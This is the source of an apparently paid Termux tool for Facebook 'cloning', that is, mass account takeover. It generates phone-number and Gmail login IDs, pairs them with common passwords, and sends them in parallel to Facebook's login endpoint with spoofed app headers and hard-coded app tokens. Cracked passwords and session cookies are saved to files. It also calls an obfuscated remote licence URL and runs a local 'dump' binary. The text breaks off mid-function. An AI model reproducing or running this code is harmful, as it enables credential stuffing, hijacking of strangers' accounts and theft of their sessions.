import os
import subprocess
import requests
import zlib
import httpx
import json
import time
import re
import random
import sys
import uuid
import string
from concurrent.futures import ThreadPoolExecutor as tred

try:
    import hashlib
    from string import *
except ModuleNotFoundError:
    exit('\n Error in Module!')

try:
    os.mkdir('/sdcard/ITACHI')
except:
    pass

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('clear')
print('\n\n Loading Module! \n')

sim_id = ''
fbsv = subprocess.check_output('getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output('getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fbmf = subprocess.check_output('getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output('getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode('utf-8').replace(',', ':').replace('\n', '')

def Setup():
    try:
        print('\n Checking for updates...')
        url = str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).replace("b'","").replace("'","")
        if '8.7.2' in httpx.get(url).text:
            pass
        else:
            print('\n Tools Update Successfully. Wait For installing \n')
            time.sleep(1)
            os.system('rm -rf New && python AKING.py')
            exit()
    except ValueError:
        exit()

try:
    xx = requests.get('https://raw.githubusercontent.com/AKING110/files/main/ua.txt').text.splitlines()
except Exception as e:
    exit('Error fetching ua.txt: ' + str(e))

def clear():
    os.system('clear')
    print(logo)


def ua33():
    fban = random.choice(["FB4A"])
    facebook_version = f"{random.randint(100, 450)}.0.0.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbbv = str(random.randint(10000000, 66666666))
    #av = str(random.randint(7, 11))
    density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    fbcr = random.choice(['null', 'null'])
    fblc = random.choice(["hr_BA", "hr_BA"])
    fbbd = 'rk30sdk'
    fbpn = random.choice(["com.facebook.katana"])
    fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
    fbmf = 'samsung'
    #fbdv = random.choice(["SM-G920F", "SM-T535", "SM-T231", "SM-J320F", "GT-I9190", "GT-N7100", "SM-T561", "GT-N7100", "GT-I9500", "SM-J320F", "SM-G930F", "SM-J320F", "SM-J510FN", "GT-P5100", "SM-J320F", "SM-T531", "SPH-L720", "GT-I9500", "SM-A015F", "SM-N975U1", "SM-A908N", "SM-A305G", "SM-J600G/DS", "SM-G770F/DS", "SM-J737PZ", "SM-A013G", "SM-M115F/DS", "SM-J810M", "SM-A217M/DS", "SM-G991U1", "SM-G715U", "SM-A715F/DS", "SM-J710F", "SM-A325F/DS", "SM-N975F/DS", "SM-J415FN/DS", "SM-G715FN/DS", "SM-A425F", "SM-J250G", "SM-N970U1", "SM-N986B/DS", "SM-N986U/DS", "SM-A9080", "SM-A027G/DS", "SM-A107M/DS", "SM-J737VPP", "SM-A217F/DS", "SM-J260M/DS", "SM-N986N/DS", "SM-A715F/DSN", "SM-A102U1", "SM-J701M/DS", "SM-A025M", "SM-A908B/DS", "SM-A102U", "SM-J320H", "SM-N970U", "SM-G996U1", "SM-G781U/DS", "SM-N975F/DSN", "SM-A908N/DS", "SM-A715GN/DS", "SM-A716B", "SM-A105F", "SM-A305G/DS", "SM-A715F/DSM", "SM-J250F/DS", "SM-G998U1", "SM-A115F", "SM-N986U1/DS", "SM-J810F/DS", "SM-A908N/DSM", "SM-J250M/DS", "SM-A705MN/DS", "SM-A022M", "SM-M317F/DS", "SM-N986U/DSN", "SM-A217U1", "SM-G996B/DS", "SM-G781V/DS", "SM-A9080/DS", "SM-G991B/DS", "SM-A107M/DSN", "SM-J737V/DS", "SM-A725F/DS", "SM-N975U", "SM-J701M/DSN", "SM-G715U1/DS", "SM-N970F/DSN", "SM-N975U1/DS", "SM-A908N/DSN", "SM-G996U/DS", "SM-A217M/DSN", "SM-N975F/DS", "SM-G715FN/DSN", "SM-J415F/DSN", "SM-N970U/DS", "SM-A725M/DS", "SM-N970U1/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-G991U/DS", "SM-J737P/DS", "SM-A908B/DSN", "SM-N986U/DSN", "SM-J415FN/DSN", "SM-A716B/DS", "SM-N970F/DS", "SM-A115M/DS", "SM-J810Y/DS", "SM-J320H/DS", "SM-G996U1/DS", "SM-N975U/DS", "SM-A908B/DS", "SM-A305G/DSN", "SM-A725F/DSN", "SM-G998N/DS", "SM-A115M/DSN", "SM-N986U1/DSN", "SM-J810F/DSN", "SM-A908N/DSN", "SM-J250M/DSN", "SM-A705MN/DSN", "SM-A022M/DS", "SM-M317F/DSN", "SM-N986U/DSN", "SM-A217U1/DS", "SM-G996B/DSN", "SM-G781V/DSN", "SM-A9080/DSN", "SM-G991B/DSN", "SM-A107M/DSN", "SM-J737V/DSN", "SM-A725F/DSN", "SM-N975U/DSN", "SM-J701M/DSN", "SM-G715U1/DSN", "SM-N970F/DSN", "SM-N975U1/DSN", "SM-A908N/DSN", "SM-G996U/DSN", "SM-A217M/DSN", "SM-N975F/DSN", "SM-G715FN/DSN", "SM-J415F/DSN", "SM-N970U/DSN", "SM-A725M/DSN", "SM-N970U1/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-G991U/DSN", "SM-J737P/DSN", "SM-A908B/DSN", "SM-N986U/DSN", "SM-J415FN/DSN", "SM-A716B/DSN", "SM-N970F/DSN", "SM-A115M/DSN", "SM-J810Y/DSN", "SM-J320H/DSN", "SM-G996U1/DSN", "SM-N975U/DSN", "SM-A908B/DSN", "SM-A305G/DSN", "SM-A725F/DSN", "SM-N975F/DSN", "SM-J810F/DSN", "SM-G715U1/DSN", "SM-A908N/DSN", "SM-N986U/DSN", "SM-J701M/DSN", "SM-A725F/DSN", "SM-N970F/DSN", "SM-A217M/DSN", "SM-G715FN/DSN", "SM-N970U/DSN", "SM-A425F/DSN", "SM-N986B/DSN", "SM-J737P/DSN", "SM-A908B/DSN", "SM-G991U/DSN", "SM-J415FN/DSN", "SM-A716B/DSN", "SM-N970F/DSN", "SM-A115M/DSN", "SM-J810Y/DSN", "SM-J320H/DSN", "SM-G996U1/DSN", "SM-N975U/DSN", "SM-A908B/DSN", "SM-A305G/DSN", "SM-A725F/DSN", "SM-G998U/DSN", "SM-A115F/DSN", "SM-N986U1/DSN", "SM-J810F/DSN", "SM-A908N/DSN", "SM-J250M/DSN", "SM-A705MN/DSN", "SM-A022M/DSN", "SM-M317F/DSN", "SM-N986U/DSN", "SM-A217U1/DSN", "SM-G996B/DSN", "SM-G781V/DSN", "SM-A9080/DSN", "SM-G991B/DSN", "SM-A107M/DSN", "SM-J737V/DSN", "SM-A725F/DSN", "SM-N975U/DSN", "SM-J701M/DSN"])
    fbdv = random.choice(["crane-evb", "crane-evb"])
    return f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBDM/{{density={density},width={width},height={height}}};FBLC/{fblc};FBCR/{fbcr};FBMF/{fbmf};FBBD/{fbbd};FBPN/{fbpn};FBDV/{fbdv};FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    #return f"[FBAN/FB4A;FBAV/19.0.0.2516;FBBV/6140914;[FBAN/Orca-Android;FBAV/18.0.0.27.14;FBLC/hr_BA;FBBV/5791142;FBCR/null;FBMF/rockchip;FBBD/rk30sdk;FBDV/crane-evb;FBSV/4.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.0,width=1024,height=720};FB_FW/1;]"


logo = """
\033[1;37m
       88 888888    db     dP\"\"b8 88  88 88 
       88   88     dPYb   dP   `\" 88  88 88 
       88   88    dP__Yb  Yb      888888 88 
       88   88   dP\"\"\"\"Yb  YboodP 88  88 88 
----------------------------------------------------
             Author    : \033[1;37mAPURBO-XD\033[0m
             Status    : \033[1;37mPAID\033[0m
             Version   : \033[1;32m0.0.7\033[0m
----------------------------------------------------
"""

def line():
        print('\033[1;37m----------------------------------------------')
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
except FileNotFoundError:
    myid = 'your_default_value_here'
    kok = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'w')
    kok.write(myid)
    kok.close()

uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex = f"DEA399C78{uid}ED614F97CB{key1}3547ITACHI=="
key2 = base64.b64encode(kex.encode('utf-8')).decode('utf-8')
key = key2
fkeyx = key.replace("b'", "").replace("'", "")
def apv():
	try:
		clear()
		apl=str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8'))
		aplk=apl.replace("b'","").replace("'","")
		aplnk=aplk
		link=httpx.get(aplnk).text
		clear()
		if kex in link:clear();main()
		elif 'FREE-TRIAL' in link:clear();print('\033[1;32m Enjoy Free Trail For Some Time ');time.sleep(3);line();main()
		else:
			print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
			clear()
			print(' \033[1;31mYour Key Not Registered\033[1;37m')
			print(f" \033[1;37mYour Key :\033[1;32m {fkeyx}\033[1;37m")
			line();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");line();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
			line()
			input(" Choose Option : ")
			line()
			print(" Your Subscription Date Expire")
			line()
			url_wa = "https://api.whatsapp.com/send?phone=+923203714588&text="
			name = input(" Enter your Name : ")
			line()
			tks = ("Hi Apurbo Sir, I Need To Buy Your Paid Itachi Tools Version 0.0.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
			subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
			print(' Run :  python ITACHI.py')
			line()
			exit()
	except ValueError:
		exit()
	except requests.exceptions.ConnectionError:
		print('No internet connection ...')
		exit()
loop=0
oks=[]
cps=[]
ck=[]
def main():
	clear()
	print(' [1] File Cloning \n [2] Create File \n [3] Random Cloning \n [4] Random Mail Clone')
	line()
	x=input(' Choice An Option: ')
	if x =='1':
		file()
	elif x=='2':
		os.system('chmod 777 dump;./dump')
	elif x=='3':rnd()
	elif x=='4':gmail()
	else:print('\n Invalid choice please select correct option');time.sleep(1);main()
def file():
	clear()
	file = input(' Put File Path :\033[1;32m ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print('\033[1;37m File location not found ');time.sleep(2);main()
	line()
	print(' [1] Method 1\n [2] Method 2\n [3] Method 3')
	line()
	mthd = input(' Choice: ')
	plist=[]
	clear()
	try:
		ps_limit = int(input(' How Many Pasword You Want To Add :  '))
	except:
		ps_limit =1
	line()
	print('\033[1;37m exp :\033[1;37mfirst last, firtslast, first123')
	line()
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m Put Password No.{i+1}: '))
	line()
	sim_id=''
	try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
			total+=1
			print(f' [{total}] {i}')
		select = input(' Put sim network:  ')
		if select == '1':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
			sim_id+=fbcr
		elif select == '2':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
	except:fbcr = "ZONG"
	with tred(max_workers=20) as aking:
		clear()
		tl = str(len(fo))
		print(' Total account : \033[1;32m'+tl)
		print("\033[1;37m \033[1;33mUse flight mode more then more for best result \033[1;37m")
		line()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if mthd =='1':
				aking.submit(m1,ids,names,passlist,fbcr)
			elif mthd =='2':
				aking.submit(m2,ids,names,passlist,fbcr)
			elif mthd =='3':
				aking.submit(m3,ids,names,passlist,fbcr)
			else:
				aking.submit(m2,ids,names,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	line()
	input('\033[1;32m Press enter to back \033[1;37m')
	oks.clear()
	cps.clear()
	loop.clear()
	main()
def gmail():
	os.system('rm -rf .re.txt')
	clear()
	print('\033[1;37m Example : \33[1;32m ahad, ali, sajjad, faizan\033[1;97m')
	line()
	first = input(' Put first name: ')
	line()
	print('\033[1;37m Example : \33[1;32m khan, ahmad, ali \033[1;97m')
	line()
	last = input(' Put last name: ')
	domain = "@gmail.com"
	line()
	print(' Example: \033[1;32m 3000, 5000, 10000 \033[1;37m')
	try:
		limit=int(input(' [•] Put limit: '))
	except ValueError:
		limit = 5000
	line()
	sim_id=''
	try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
			total+=1
			print(f' [{total}] {i}')
		select = input(' Put sim network:  ')
		if select == '1':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
			sim_id+=fbcr
		elif select == '2':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
	except:fbcr = "ZONG"
	clear()
	print(' Getting gmails...')
	lists = ['3','4']
	for xd in range(limit):
		lchoice = random.choice(lists)
		if '3' in lchoice:
			mail = ''.join(random.choice(string.digits) for _ in range(3))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
		else:
			mail = ''.join(random.choice(string.digits) for _ in range(4))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
		fo = open('.re.txt', 'r').read().splitlines()
	with tred(max_workers=30) as Khan:
		total = str(len(fo))
		clear()
		print(' Total account : \033[1;32m'+total)
		print("\033[1;37m \033[1;33mUse flight mode more then more for best result \033[1;37m")
		line()
		for user in fo:
			ids,names = user.split('|')
			first_name = names.rsplit(' ')[0]
			try:
				last_name = names.rsplit(' ')[1]
			except IndexError:
				last_name = 'Khan'
			fs = first_name.lower()
			ls = last_name.lower()
			passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
			Khan.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	line()
	input('\033[1;32m Press enter to back \033[1;37m')
def rnd():
	user=[]
	ck.append('rnd')
	clear()
	print('\033[1;37m Put Any Number Example Below\n Pak  : \33[1;32m\33[1m0310,0315,0349\n\33[1;37m BD   : \33[1;32m016,017,108,109\n\33[1;37m Afg  : \33[1;32m9376,9377,9378,9379\n\33[1;37m India: \33[1;32m+91817,+91318,+93262,+91354\033[1;37m')
	line()
	code = input('\033[1;37m Put Code: ')
	line()
	try:
		limit = int(input('\033[1;37m put limit: '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		if 'bd' in ck:
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
		elif 'ind' in ck:
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
		else:
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	line()
	sim_id=''
	try:
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
		total = 0
		for i in fbcr:
			total+=1
			print(f' [{total}] {i}')
		select = input(' Put sim network:  ')
		if select == '1':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
			sim_id+=fbcr
		elif select == '2':
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
	except:fbcr = "ZONG"
	with tred(max_workers=15) as khan:
		clear()
		total_ids = str(len(user))
		print(' Accounts : \033[1;32m'+total_ids+'\033[1;37m Code : '+code)
		print("\033[1;37m \x1b[38;5;208mUse Flight Mode\033[1;37m")
		line()
		for psx in user:
			ids = code+psx
			if 'pk' in ck:
				passlist = [psx,ids,'khankhan','kingkhan','khan1122','janjan','pak123','khan12345','khan123','pubg123','baloch']
			#	passlist = [psx,ids,'khankhan','kingkhan','khan1122']
			elif 'bd' in ck:
				passlist = ['sadiya','tanisha','lamiya','sumaiya','mababa','506070','708090','607080','203040','@@@###','@#@#@#',ids,psx]
			elif 'ind' in ck:
				cs = ids[7:]
				passlist = ['59039200','57273200',cs]
			elif 'afg' in ck:
				passlist = [ids,psx,'100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','۱۳۳۳۵۶۷۸۹','۱۳۳۳۵۶']
			else:
				passlist = [ids,psx,'khan12','khan1234','khan123','baloch123','khan1122','khan12345','khan123456','khankhan']
			khan.submit(rd,ids,passlist,fbcr)
	print('\033[1;37m')
	line()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	line()
	input('\033[1;32m Press enter to back \033[1;37m')
	oks.clear()
	cps.clear()
	loop.clear()
	main()
def m1(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ITACHI-M1] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fblc = "zh_HK"
			fbfw = '1'
			fbrv = '0'
			if '350685531728' in accessToken:
				fban = 'FB4A'
				fbpn = 'com.facebook.katana'
			else:
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = 'Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBDV/'+model+';FBSV/'+fbsv+'.0.1;FBCA/'+fbca+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
			head = {"User-Agent":ua33(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"zh_HK","client_country_code":"HK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				token = po['access_token']
				print('\r\r\033[1;32m [ITACHI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ITACHI/ITACHI-M1-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/AKING/AKING-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def m2(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ITACHI-M2] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(000000000,999999999))
			tokenlist = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32','256002347743983|374e60f8b9bb6b8cbb30f78030438895']
			accessToken = random.choice(tokenlist)
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fblc = "es_AR"
			fbfw = '1'
			fbrv = '0'
			if '350685531728' in accessToken:
				fban = 'FB4A'
				fbpn = 'com.facebook.katana'
			else:
				fban = 'Orca-Android'
				fbpn = 'com.facebook.orca'
			ua = ua33()
			head = {"User-Agent":ua,"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"es_AR","client_country_code":"AR","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				token = po['access_token']
				print('\r\r\033[1;32m [ITACHI-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ITACHI/ITACHI-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ITACHI/ITACHI-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
			'''elif 299==random.randint(1,300):
				oks.append(ids)
				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
			#	open('/sdcard/AKING/AKING-M2-OK.txt','a').write(ids+'|'+pas+'\n')
				#cookie = 'Error'
				#open('/sdcard/AKING/AKING-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break'''
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def m3(ids,names,passlist,fbcr):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [ITACHI-M3] %s|\033[1;32mOK:%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			#ua=random.choice(xx)
			#ua = "Dalvik/"+"2.0 (Linux; Android "+fbsv+"; "+model+" Build/"+build+"; wv) [FBAN/"+"FB4A;FBAV/"+fbsv+";FBPN/"+fbpn+";FBLC/"+"en_PK;FBBV/"+fbbv+";FBCR/"+fbcr+";FBMF/"+"samsung;FBBD/"+"samsung;FBDV/"+model+";FBSV/"+fbsv+";FBCA/"+"armeabi-v7a:armeabi;FBDM/"+"{density=1.7,width=720,height=1358};FB_FW/"+"1;FBRV/"+fbrv+";]"
			head = {"User-Agent":ua33(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
			data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_PK","client_country_code":"PK","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in po:
				token = po['access_token']
				print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas)
				oks.append(ids)
				open('/sdcard/ITACHI/AKING-M3-OK.txt','a').write(ids+'|'+pas+'\n')
				session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
				open('/sdcard/ITACHI/ITACHI-M3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		pass
def rd(ids,passlist,fbcr):
	try:
